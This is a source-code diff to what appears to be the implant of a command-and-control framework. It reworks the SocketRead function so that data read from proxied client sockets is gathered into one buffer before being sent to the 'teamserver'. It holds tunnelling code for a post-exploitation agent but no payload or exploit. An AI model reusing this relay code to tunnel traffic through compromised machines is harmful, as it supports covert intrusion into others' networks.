@@ -279,9 +279,11 @@ VOID SocketClients()
 /* Read data from the clients */
 VOID SocketRead()
 {
-    PPACKAGE     Package = NULL;
-    PSOCKET_DATA Socket  = NULL;
-    BUFFER       Buffer  = { 0 };
+    PPACKAGE     Package     = NULL;
+    PSOCKET_DATA Socket      = NULL;
+    PVOID        NewBuffer   = NULL;
+    BUFFER       PartialData = { 0 };
+    BUFFER       FullData    = { 0 };
 
     Socket = Instance.Sockets;
 
@@ -294,14 +296,20 @@ VOID SocketRead()
         /* reads data from connected clients/socks proxies */
         if ( Socket->Type == SOCKET_TYPE_CLIENT || Socket->Type == SOCKET_TYPE_REVERSE_PROXY )
         {
+            FullData.Length = 0;
+            FullData.Buffer = NULL;
+
             do
             {
+                PartialData.Length = 0;
+                PartialData.Buffer = NULL;
+
                 /*
                  * FIONREAD returns the amount of data that can be read in a single call to the recv function
                  * this might not be the same as the total amount of data queued on the socket.
                  * because of this, we read for new data in a loop
                  */
-                if ( Instance.Win32.ioctlsocket( Socket->Socket, FIONREAD, &Buffer.Length ) == SOCKET_ERROR )
+                if ( Instance.Win32.ioctlsocket( Socket->Socket, FIONREAD, &PartialData.Length ) == SOCKET_ERROR )
                 {
                     PRINTF( "Failed to get the read size from %x : %d\n", Socket->ID, Socket->Type )
 
@@ -315,36 +323,70 @@ VOID SocketRead()
                     break;
                 }
 
-                if ( Buffer.Length > 0 )
+                if ( PartialData.Length > 0 )
                 {
-                    Buffer.Buffer = NtHeapAlloc( Buffer.Length );
-                    Buffer.Length = RecvAll( Socket->Socket, Buffer.Buffer, Buffer.Length );
+                    PartialData.Buffer = NtHeapAlloc( PartialData.Length );
+                    PartialData.Length = RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length );
 
-                    if ( Buffer.Length > 0 )
+                    if ( PartialData.Length > 0 )
                     {
-                        PRINTF( "Read %ld bytes from socket %x\n", Buffer.Length, Socket->ID )
-
-                        /* Create socket request package */
-                        Package = PackageCreate( DEMON_COMMAND_SOCKET );
-
-                        /* tell the teamserver to write to the socket of the forwarded host */
-                        PackageAddInt32( Package, SOCKET_COMMAND_READ_WRITE );
-                        PackageAddInt32( Package, Socket->ID );
-                        PackageAddInt32( Package, Socket->Type );
-
-                        /* add the data we read from the client socket */
-                        PackageAddBytes( Package, Buffer.Buffer, Buffer.Length );
-
-                        /* now let's send it */
-                        PackageTransmit( Package, NULL, NULL );
-
-                        /* free and clear out our buffer */
-                        MemSet( Buffer.Buffer, 0, Buffer.Length );
-                        NtHeapFree( Buffer.Buffer )
-                        Buffer.Buffer = NULL;
+                        if ( ! FullData.Buffer )
+                        {
+                            FullData.Buffer    = PartialData.Buffer;
+                            FullData.Length    = PartialData.Length;
+                            PartialData.Buffer = NULL;
+                        }
+                        else
+                        {
+                            // allocate a new buffer to store the old and new data
+                            NewBuffer = NtHeapAlloc( FullData.Length + PartialData.Length );
+                            // copy the old data into the new buffer
+                            MemCopy( NewBuffer, FullData.Buffer, FullData.Length );
+                            // free the old 'FullData' buffer
+                            MemSet( FullData.Buffer, 0, FullData.Length );
+                            NtHeapFree( FullData.Buffer );
+                            // set the new buffer into 'FullData'
+                            FullData.Buffer = NewBuffer;
+                            NewBuffer = NULL;
+                            // copy the new data
+                            MemCopy( C_PTR( U_PTR( FullData.Buffer ) + FullData.Length ), PartialData.Buffer, PartialData.Length );
+                            FullData.Length += PartialData.Length;
+                            // free the new data
+                            MemSet( PartialData.Buffer, 0, PartialData.Length );
+                            NtHeapFree( PartialData.Buffer );
+                            PartialData.Buffer = NULL;
+                        }
                     }
                 }
-            } while ( Buffer.Length > 0 );
+            } while ( PartialData.Length > 0 );
+
+            if ( FullData.Length > 0 )
+            {
+                PRINTF( "Read %ld bytes from socket %x\n", FullData.Length, Socket->ID )
+
+                /* Create socket request package */
+                Package = PackageCreate( DEMON_COMMAND_SOCKET );
+
+                /* tell the teamserver to write to the socket of the forwarded host */
+                PackageAddInt32( Package, SOCKET_COMMAND_READ_WRITE );
+                PackageAddInt32( Package, Socket->ID );
+                PackageAddInt32( Package, Socket->Type );
+
+                /* add the data we read from the client socket */
+                PackageAddBytes( Package, FullData.Buffer, FullData.Length );
+
+                /* now let's send it */
+                PackageTransmit( Package, NULL, NULL );
+            }
+
+            if ( FullData.Buffer )
+            {
+                /* free and clear out our buffer */
+                MemSet( FullData.Buffer, 0, FullData.Length );
+                NtHeapFree( FullData.Buffer );
+                FullData.Length = 0;
+                FullData.Buffer = NULL;
+            }
         }
 
         Socket = Socket->Next;
